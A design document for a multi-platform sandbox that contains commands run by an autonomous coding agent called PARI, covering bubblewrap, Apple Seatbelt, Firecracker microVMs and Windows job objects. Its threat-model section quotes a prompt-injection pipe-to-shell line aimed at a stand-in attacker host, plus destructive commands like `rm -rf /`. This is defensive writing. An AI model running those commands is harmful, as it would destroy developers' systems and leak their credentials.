# Layer 0: Multi-Platform Kernel Sandboxing Engine

> **Closes Failures**: Claude Code F2 (macOS-only sandbox), Pi F1 (unsandboxed host execution), Aider F1 (unsandboxed execution), OpenCode F1 (userspace permission modal only).  
> **Harvested From**: OpenAI Codex (`bwrap` on Linux, `Seatbelt` on macOS), E2B (Cloud Firecracker microVMs), and Antigravity (Process Group / Workspace Guard fallback).

---

## 1. Overview & Core Philosophy

Autonomous coding agents execute arbitrary shell commands, install third-party dependencies, and run compiler toolchains. Relying on user permission prompts (OpenCode) or executing directly on the host (Pi, Aider) is an existential security vulnerability:
* A prompt injection attack embedded in a repository file can execute `curl attacker.com/leak | sh`.
* A hallucinated command (e.g. `rm -rf /` or `chmod -R 777 ~`) can irreparably destroy the developer's system.
* Stored secrets in `~/.ssh`, `~/.aws`, `~/.config`, and environment variables are vulnerable to exfiltration.

PARI implements a **Multi-Platform Sandbox Engine** providing sub-10ms, kernel-enforced process containment across Linux, macOS, Windows, and Cloud environments without requiring heavy virtualization like Docker Desktop.

```
PARI SANDBOX SELECTION DISPATCHER:

                          ┌── Cloud Mode     ──> E2B Firecracker MicroVM (Hardware KVM)
                          │
  PARI Layer 0 Dispatcher ┼── Linux / WSL2   ──> Bubblewrap (bwrap + cgroups v2)
                          │
                          ├── macOS (Darwin) ──> Apple Seatbelt (sandbox-exec + Scheme profile)
                          │
                          └── Native Windows ──> Supervised Process Group + Path Guard (Fallback)
```

---

## 2. Dispatcher Architecture & Staged Implementation Scope

> **v1 Staged Scope**: **Linux and Windows WSL2 via Bubblewrap (`bwrap`)** is the primary, production-tested Tier 1 backend for v1. It provides verified unprivileged namespace isolation, `--die-with-parent` lifecycle control, and cgroups v2 resource bounds. macOS Seatbelt, E2B Cloud, and Windows Supervised modes are staged for subsequent validation.

When PARI initializes an execution turn, the Layer 0 Dispatcher instantiates the appropriate isolation driver:


```python
# Dispatcher logic (pari/sandbox/dispatcher.py)
import sys
import os


def get_sandbox_runner(config, workspace_dir: str):
    if config.mode == "cloud" or os.environ.get("PARI_SANDBOX") == "cloud":
        return E2BCloudSandboxRunner(
            api_key=config.e2b_api_key, template=config.cloud_template
        )
    elif sys.platform == "linux":
        # Natively handles both Linux bare-metal and Windows WSL2
        return BwrapSandboxRunner(
            workspace=workspace_dir, memory_max="2G", cpu_weight=100
        )
    elif sys.platform == "darwin":
        # Native macOS XNU kernel sandbox
        return MacOSSeatbeltSandboxRunner(
            workspace=workspace_dir, profile="pari_rules.sb"
        )
    elif sys.platform == "win32":
        # Native Windows without WSL2
        return WindowsSupervisedGuardrailRunner(workspace=workspace_dir)
    else:
        raise RuntimeError(f"Unsupported operating system platform: {sys.platform}")
```

---

## 3. Platform Backends

### Backend 1: Linux & Windows WSL2 via Bubblewrap (`bwrap`)

Bubblewrap leverages Linux unprivileged user namespaces to construct lightweight, isolated containers with **zero root privileges** required.

* **Startup Latency**: $< 5\text{ ms}$.
* **Kernel Namespaces Used**:
  * `CLONE_NEWUSER`: Creates a private user namespace; root inside sandbox is unprivileged on the host.
  * `CLONE_NEWNS`: Private mount namespace; filesystem modifications cannot leak out.
  * `CLONE_NEWPID`: Process namespace; sandbox processes cannot inspect or signal host processes.
  * `CLONE_NEWIPC`: Isolated System V IPC and POSIX message queues.
  * `CLONE_NEWUTS`: Isolated hostname.

#### Filesystem Mount Topology
* **Writable Workspace**: `--bind <workspace> <workspace>` (strictly confined to workspace directory).
* **System Binaries**: `--ro-bind /usr /usr`, `--ro-bind /lib /lib`, `--ro-bind /lib64 /lib64`, `--ro-bind /bin /bin` (read-only access to host compilers, python, node, and standard utilities).
* **Ephemeral Temp**: `--tmpfs /tmp` (isolated temporary memory filesystem, wiped upon process exit).
* **Secret Blackout**: `~/.ssh`, `~/.aws`, `~/.gnupg`, and `~/.bashrc` are never mounted. They do not exist inside the sandbox.

#### Process Tree Lifecycle & Zombie Prevention
Codex suffered from orphaned `exec-server` processes when client CLIs were terminated with `SIGKILL`. PARI closes this via:
* Passing `--die-with-parent` to `bwrap`.
* Invoking `prctl(PR_SET_PDEATHSIG, SIGKILL)` on Linux. If the PARI parent process dies for any reason, the Linux kernel immediately issues `SIGKILL` to all sandboxed child processes.

#### Resource Throttling via cgroups v2
To prevent fork-bombs and memory exhaustion:
* `memory.max = 2G`: Process is killed if RAM exceeds 2 GB.
* `cpu.weight = 100`: Throttles CPU consumption relative to host system tasks.
* `pids.max = 256`: Rejects unbounded process creation.

---

### Backend 2: macOS via Apple Seatbelt (`sandbox-exec`)

On macOS, Bubblewrap is not available. PARI implements native Apple Seatbelt sandboxing via `sandbox-exec` using a compiled Scheme (`.sb`) profile, matching the isolation standard used in production by OpenAI Codex and Claude Code.

* **Startup Latency**: $< 10\text{ ms}$.
* **Kernel Mechanism**: XNU kernel Mandatory Access Control (MAC) framework.

#### Production Seatbelt Profile (`pari_rules.sb`)
```scheme
(version 1)
;; Default policy: deny everything
(deny default)

;; Allow process creation and execution of host system binaries
(allow process-exec)
(allow process-fork)

;; Read-only access to system libraries, frameworks, and command-line tools
(allow file-read* 
    (subpath "/usr") 
    (subpath "/System") 
    (subpath "/Library") 
    (subpath "/Applications")
    (subpath "/Library/Developer/CommandLineTools")
    (subpath "/opt/homebrew"))

;; Writable access strictly confined to the active project workspace
(allow file-read* file-write* 
    (subpath "<WORKSPACE_ROOT>"))

;; Ephemeral write access to temporary directories
(allow file-read* file-write* 
    (subpath "/private/tmp")
    (subpath "/private/var/folders"))

;; Explicit secret blackout: deny all access to credentials
;; IMPORTANT: Apple Seatbelt Scheme profiles do NOT expand '~' automatically.
;; Paths must be resolved to the absolute user home directory prior to profile compilation.
(deny file* 
    (subpath "<USER_HOME>/.ssh")
    (subpath "<USER_HOME>/.aws")
    (subpath "<USER_HOME>/.gnupg")
    (subpath "<USER_HOME>/.config"))

;; Network: allow outbound HTTP/HTTPS for dependency managers (pip, npm, cargo)
(allow network-outbound 
    (remote tcp "*:443") 
    (remote tcp "*:80")
    (remote tcp "*:53")) ;; DNS resolution

;; Deny inbound network listener sockets (prevents unauthorized daemon hosting)
(deny network-inbound)
```

---

### Backend 3: Cloud Mode via E2B Firecracker MicroVMs

For CI/CD execution, shared cloud infrastructure, or multi-tenant SaaS environments, OS-level namespaces are insufficient to protect against kernel 0-day exploits.

PARI integrates **E2B Firecracker MicroVMs**:
* **Startup Latency**: $\approx 100\text{–}150\text{ ms}$ via snapshot restore.
* **Hardware Isolation**: Complete hardware-level virtualization via Linux KVM (`/dev/kvm`).
* **Lifecycle**: Ephemeral devboxes are provisioned on demand for an agent session, synchronized with the git commit, and instantaneously destroyed upon session completion.
* **Strategic Value**: Delivers Devin-grade hardware isolation without spending weeks writing custom hypervisors or vsock network bridges.

---

### Backend 4: Native Windows Fallback (Supervised Guardrails)

For developers on native Windows without WSL2 installed:
1. **Path Guard**: `FileMutationQueue` enforces `Path.resolve().is_relative_to(WORKSPACE_ROOT)`. Any attempt to write to `C:\Windows`, `C:\Program Files`, or user profile roots throws an immediate security exception.
2. **Job Objects**: Child processes are attached to a Windows Job Object configured with:
   * Memory quota limit: `2 GB`.
   * `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`: Guarantees all spawned processes are terminated when PARI exits (equivalent to Linux `die-with-parent`).
3. **Interactive Confirmation**: Destructive shell patterns (e.g. `Remove-Item -Recurse`, disk operations) pause execution for user confirmation.
4. **WSL2 Recommendation**: The CLI displays a notification on launch:
   ```
   [PARI Security Notice] Running on native Windows with Supervised Guardrails.
   Recommendation: Launch inside WSL2 ('wsl pari') for full hardware-grade bwrap kernel isolation.
   ```

---

## 4. Benchmark & Performance Comparison

| Driver | Target Platform | Startup Latency | Memory Overhead | Kernel Containment |
|---|---|---|---|---|
| **Bubblewrap (`bwrap`)** | Linux / Windows WSL2 | $3\text{–}5\text{ ms}$ | $< 2\text{ MB}$ | **Full unprivileged namespaces** |
| **Apple Seatbelt** | macOS (Darwin) | $5\text{–}10\text{ ms}$ | $< 5\text{ MB}$ | **Full XNU MAC kernel containment** |
| **E2B Firecracker** | Cloud / CI Multi-tenant | $120\text{ ms}$ | MicroVM isolated | **Hardware KVM hypervisor** |
| **Windows Job Object** | Native Windows | $15\text{ ms}$ | Minimal | **Path guards + Job quotas** |
| *Docker Desktop (Discarded)* | *Any* | *$1,500\text{–}4,000\text{ ms}$* | *$2\text{–}4\text{ GB}$* | *Daemon dependency overhead* |

---

## 5. Security Invariants

1. **Host Secrets are Invisible**: Secret directories (`~/.ssh`, `~/.aws`, `~/.gnupg`) are never bind-mounted or exposed inside any sandbox environment.
2. **No Orphan Processes**: Sandboxes are guaranteed to terminate upon parent process termination via kernel signals (`PR_SET_PDEATHSIG` / `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`).
3. **Workspace Confinement**: Read-write access is strictly locked to the workspace directory. File writes to parent paths (`../`) are intercepted and rejected at the kernel layer.
